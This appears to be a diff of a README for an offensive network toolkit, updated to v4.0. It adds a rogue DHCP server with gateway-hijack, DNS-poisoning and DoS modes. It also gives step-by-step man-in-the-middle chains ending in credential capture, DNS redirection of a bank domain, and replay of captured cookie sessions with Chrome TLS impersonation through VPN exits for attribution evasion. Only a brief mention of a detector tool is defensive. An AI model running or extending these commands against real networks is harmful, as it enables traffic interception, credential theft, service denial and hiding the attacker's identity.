@@ -1,12 +1,14 @@
-# ClaudeCodeIPTool v3.0
+# ClaudeCodeIPTool v4.0
 
-Complete IP spoofing, session replay, and proxy routing suite for VDT (Vulnerability Discovery Testing). Ten functional tools covering reconnaissance, Chrome TLS impersonation, SOCKS5 proxy routing, MITM attacks, and defense monitoring.
+Complete IP spoofing, session replay, and proxy routing suite for VDT (Vulnerability Discovery Testing). **11 functional tools** covering reconnaissance, Chrome TLS impersonation, SOCKS5 proxy routing, MITM attacks (ARP/DNS/DHCP), and defense monitoring.
+
+**New in v4.0:** DHCP spoofing with RFC 2131 4-way handshake, gratuitous ARP, bidirectional poisoning.
 
 ## Tools
 
 ### Session Routing (New in v3.0)
 
-#### 9. `session_replay.py` - Cookie-Based Session Replay with Chrome TLS Impersonation
+#### 11. `session_replay.py` - Cookie-Based Session Replay with Chrome TLS Impersonation
 **KEY TOOL** for replaying captured browser sessions with proper TLS fingerprinting:
 - Uses `curl_cffi` to mimic Chrome's exact JA3/JA3s/ALPN fingerprint
 - Reads Netscape-format cookie files (from browser exports or VDT harvests)
@@ -22,7 +24,7 @@ python3 session_replay.py test-tls --url https://tls.browserleaks.com/tls
 
 **Status**: ✓ Functional (requires `pip install curl_cffi`)
 
-#### 10. `windscribe_socks.py` - Windscribe SOCKS5 Proxy + Chrome TLS Chain
+#### 12. `windscribe_socks.py` - Windscribe SOCKS5 Proxy + Chrome TLS Chain
 **ROUTING TOOL** for channeling sessions through VPN exit IPs:
 - Routes `curl_cffi` sessions through Windscribe's SOCKS5 proxy (localhost:1080)
 - Shows exit IP and ASN before/after proxy to confirm routing change
@@ -44,7 +46,35 @@ python3 windscribe_socks.py probe https://ipinfo.io/json
 
 ### Offensive Tools
 
-#### 1. `spoofer.py` - Core IP Spoofing Techniques
+#### 1. `dhcp-spoof.py` - **NEW** DHCP 4-Way Handshake Spoofing
+**MITM VIA NETWORK CONFIGURATION** - Rogue DHCP server implementing RFC 2131:
+- Complete DISCOVER → OFFER → REQUEST → ACK handshake
+- Gateway redirection (become default route for full MITM)
+- DNS poisoning (Option 6: redirect DNS queries)
+- Network isolation attacks (invalid gateway = DoS)
+- Three attack modes: `gateway`, `dns`, `isolate`
+
+```bash
+# Full MITM via gateway redirection
+sudo python3 dhcp-spoof.py --mode gateway -v
+
+# DNS poisoning only (keep real gateway)
+sudo python3 dhcp-spoof.py --mode dns
+
+# Network isolation DoS
+sudo python3 dhcp-spoof.py --mode isolate
+```
+
+**Status**: ✓ Functional (requires root/sudo, tested against controlled targets)
+
+**Technical Details:**
+- Option 3 (router): Gateway redirection attack surface
+- Option 6 (name_server): DNS poisoning vector  
+- Option 51 (lease_time): Attack persistence control
+- Options 58/59 (T1/T2): Renewal timing (T1=T/2, T2=7T/8 per RFC)
+- Transaction ID matching across handshake for proper client tracking
+
+#### 3. `spoofer.py` - Core IP Spoofing Techniques
 Educational demonstrations of 5 spoofing primitives:
 - TCP SYN flood with forged source
 - UDP amplification (reflection attacks)
@@ -108,7 +138,7 @@ Complete MITM attack toolkit:
 
 ### Defensive Tools
 
-#### 8. `defense-detector.py` - Attack Detection
+#### 10. `defense-detector.py` - Attack Detection
 Defend YOUR network against spoofing attacks:
 - ARP spoof detection (MAC change monitoring)
 - DNS spoof detection (IP inconsistency tracking)
@@ -135,9 +165,26 @@ sudo python3 spoofer.py demo 127.0.0.1
 
 ## Usage Examples
 
-### Full MITM Attack Chain
+### Full MITM Attack Chains
 
-Complete attack from network discovery → credential capture:
+**Method 1: DHCP-Based MITM (Network-Wide, Stealthy)**
+
+```bash
+# 1. Start rogue DHCP server (gateway redirection mode)
+sudo python3 dhcp-spoof.py --mode gateway -v
+
+# 2. Wait for client DHCP renewal or force it:
+#    On target: sudo dhclient -r && sudo dhclient
+
+# 3. Client accepts malicious DHCP OFFER → you become their gateway
+
+# 4. All traffic now routes through you - capture credentials
+sudo python3 mitm-suite.py -v
+
+# Clean, no repeated ARP poisoning needed
+```
+
+**Method 2: ARP-Based MITM (Layer 2, Immediate)**
 
 ```bash
 # 1. Discover targets on network
@@ -182,6 +229,18 @@ sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50
 
 # Redirect ALL domains (wildcard)
 sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50
+```
+
+**DHCP Spoofing:**
+```bash
+# Gateway MITM (become default route)
+sudo python3 dhcp-spoof.py --mode gateway -v
+
+# DNS poisoning only
+sudo python3 dhcp-spoof.py --mode dns
+
+# Network isolation DoS
+sudo python3 dhcp-spoof.py --mode isolate
 ```
 
 **MITM Credential Capture:**
@@ -357,12 +416,27 @@ Result: Spoofed packet never leaves your network
 
 ## O'Reilly Book References
 
-Core concepts from VDT book corpus:
+Core concepts from VDT book corpus (16 books, 300+ chapters):
 
+**Protocol Internals:**
+- **TCP/IP Illustrated Vol 1 Ch4**: ARP cache timing (20 min completed, 3 min incomplete), gratuitous ARP
+- **TCP/IP Illustrated Vol 1 Ch6**: DHCP 4-way handshake, Options 3/6/51/58/59
+- **TCP/IP Illustrated Vol 1 Ch11**: DNS transaction ID matching
+
+**Attack Techniques:**
 - **Violent Python Ch4**: TTL-based spoof detection (H.D. Moore Pentagon technique)
-- **Python for Security Ch5**: Scapy packet crafting, `send()`, `sr()` family
-- **Network Security Hacks**: ARP spoofing, ICMP redirects
-- **DDoS (Eric Chou)**: Amplification factors, reflection attacks
+- **Python for Security Ch5**: Scapy packet crafting, `send()`, `sr()`, layer stacking with `/`
+- **Attacking Network Protocols Ch7**: Protocol security weaknesses
+- **Attacking Network Protocols Ch10**: Exploitation methodology
+
+**Advanced Topics:**
+- **IPv6 Security Ch2/Ch5**: NDP poisoning, Router Advertisement spoofing
+- **Learning eBPF**: Kernel-level packet manipulation (XDP, TC-BPF)
+- **Practical IoT Hacking**: mDNS/LLMNR/NBT-NS attacks
+- **Network Programmability**: Netlink, NFQUEUE, namespace exploitation
+- **Industrial Network Security 1st/2nd/3rd Ed**: ICS/OT protocol attacks
+- **Kubernetes Security**: Container network namespace escapes
+- **WebSocket / Programming WebRTC**: Real-time bidirectional hijacking
 
 ---
 
@@ -407,16 +481,18 @@ MCP server provides natural language interface to toolkit:
    └─ Run on victim network      → Detects attack in progress
 ```
 
-### One-Way vs Bidirectional
+### One-Way vs Bidirectional vs Network-Layer
 
 | Tool | Type | Range | Use Case |
 |------|------|-------|----------|
 | spoofer.py | One-way | Internet-wide | Reflection attacks, attribution evasion |
 | spoof-scanner.py | One-way | Internet-wide | Amplification vector discovery |
 | ghostport.py | One-way | Internet-wide | Stealth port scanning |
-| arp-spoof.py | **Bidirectional** | Same LAN only | MITM, session hijacking |
-| dns-spoof.py | **Bidirectional** | Same LAN only | Traffic redirection |
-| mitm-suite.py | **Bidirectional** | Same LAN only | Credential capture |
+| dhcp-spoof.py | **Network-Layer MITM** | Same subnet | Gateway/DNS redirection, network config attacks |
+| arp-spoof.py | **Bidirectional (L2)** | Same LAN only | MITM, session hijacking |
+| dns-spoof.py | **Bidirectional (L2)** | Same LAN only | Traffic redirection |
+| mitm-suite.py | **Bidirectional (L2)** | Same LAN only | Credential capture |
 
 **One-way**: Send packets with forged source, no responses received (responses go to real spoofed IP)  
-**Bidirectional**: Layer 2 manipulation, receive responses (target thinks you ARE the spoofed IP)
+**Bidirectional (L2)**: Layer 2 manipulation, receive responses (target thinks you ARE the spoofed IP)  
+**Network-Layer MITM**: Exploit network configuration protocols (DHCP) to redirect traffic at routing layer
